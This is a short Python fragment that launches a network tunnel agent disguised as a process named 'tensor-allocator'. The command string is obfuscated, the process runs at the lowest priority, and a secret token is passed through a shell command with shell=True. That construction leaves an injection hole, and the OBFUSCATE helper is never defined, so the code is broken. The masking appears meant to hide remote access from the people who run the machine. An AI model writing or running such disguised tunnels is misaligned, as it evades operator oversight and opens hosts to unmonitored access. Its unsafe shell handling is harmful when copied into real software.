import subprocess
import os
from .utils import decode_cmd

def start(tm_log, playit_token):
    cmd2_5_base = decode_cmd(OBFUSCATE("nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"))
    cmd2_5 = f"{cmd2_5_base}{playit_token}'"
    
    env = os.environ.copy()
    subprocess.Popen(cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT)
